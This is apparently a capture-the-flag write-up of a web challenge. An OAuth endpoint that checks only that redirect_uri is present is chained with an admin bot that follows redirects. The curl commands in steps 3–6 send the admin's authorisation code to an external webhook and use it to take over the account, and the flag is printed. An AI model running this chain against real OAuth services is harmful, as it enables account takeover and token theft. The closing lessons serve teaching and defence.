# Gateway — web, medium — 1000 pts

**Flag:** `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`

An OAuth 2.0 authorisation server plus a support-ticket feature that drives a headless bot. Source
provided.

---

## Step 1 — find the missing check

`src/services/oauth.service.js`:

```js
function validateAuthorizeRequest(q) {
  if (q.response_type !== 'code')  return err('unsupported_response_type');
  if (q.client_id !== config.clientId) return err('invalid_client');
  if (!q.redirect_uri)             return err('invalid_request');   // <-- presence only
  return ok();
}
```

`redirect_uri` is checked for **presence**, never compared against
`config.registeredRedirectBase`. So `/oauth/authorize` will mint an authorisation code and 302 it to
*any absolute URL* we name.

On its own that is only useful if we can make a privileged user walk through it.

## Step 2 — find the confused deputy

`src/services/bot.service.js`, reached via `POST /support/ticket`:

```js
await page/axios.get(config.baseUrl + path, { maxRedirects: 5, jar });
```

A server-side agent that (a) authenticates as admin with per-instance random credentials, (b)
fetches `baseUrl + path` where `path` comes from our ticket, and (c) **follows up to 5 redirects**.

So: we supply a `path` pointing at the app's own `/oauth/authorize`, with a `redirect_uri` pointing
at us. The bot authorises *as admin* and the 302 carries the admin's authorisation code straight out
to our host.

Constraint: `path` is concatenated onto `baseUrl`, so it must begin with `/` — we control the
path and query, not the host. That is enough.

## Step 3 — collect the prerequisites

The `client_id` is per-instance, and `GET /login` renders the authorize URL containing it:

```
client_id = fd60312b344335ba23cc522939979c68
```

Set up an exfiltration sink (the container has outbound internet):

```console
$ curl -s -X POST https://webhook.site/token
```

## Step 4 — fire

```console
$ curl -s -X POST http://$HOST:$PORT/support/ticket \
    -d 'path=/oauth/authorize?response_type=code&client_id=fd60312b344335ba23cc522939979c68&redirect_uri=https://webhook.site/<uuid>&scope=read:profile'
```

The bot logs in as `admin_xxxx`, hits `/oauth/authorize`, passes validation (its session is
authenticated, and `redirect_uri` is merely present), and is redirected to our webhook:

```
GET /<uuid>?code=3b692c22-....
```

## Step 5 — exchange the code

```console
$ curl -s -X POST http://$HOST:$PORT/oauth/token \
    -H 'Content-Type: application/json' \
    -d '{"grant_type":"authorization_code","code":"3b692c22-...","client_id":"fd603...","redirect_uri":"https://webhook.site/<uuid>"}'
{"access_token":"..."}
```

The token endpoint requires `redirect_uri` to **match the one bound to the code** — not to be a
registered URI. Since we chose it at both steps, it matches.

## Step 6 — use it

```console
$ curl -s http://$HOST:$PORT/profile \
       -H 'Authorization: Bearer <access_token>' -H 'Accept: application/json'
{"...":"HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}"}
```

`state` is never needed — we bypass `/callback` entirely rather than forging a victim's browser flow.

---

## Lessons

- **`redirect_uri` must be matched against a registered allowlist, exactly.** RFC 6749 §3.1.2.2 and
  §10.6 exist for precisely this. Presence checks, prefix checks and "starts with our domain" checks
  are all bypassable.
- **A server-side fetcher that follows redirects is a confused deputy.** If it carries privileged
  credentials, set `maxRedirects: 0` and validate the final host, or don't let users influence the URL.
- Chain the two: an open redirect inside an authorisation endpoint plus an authenticated crawler is
  a complete account-takeover primitive, even though each half looks minor in isolation.
- Binding a code to its `redirect_uri` at exchange time is a good control — but it only constrains
  *consistency*, not *legitimacy*. It cannot compensate for missing registration validation.
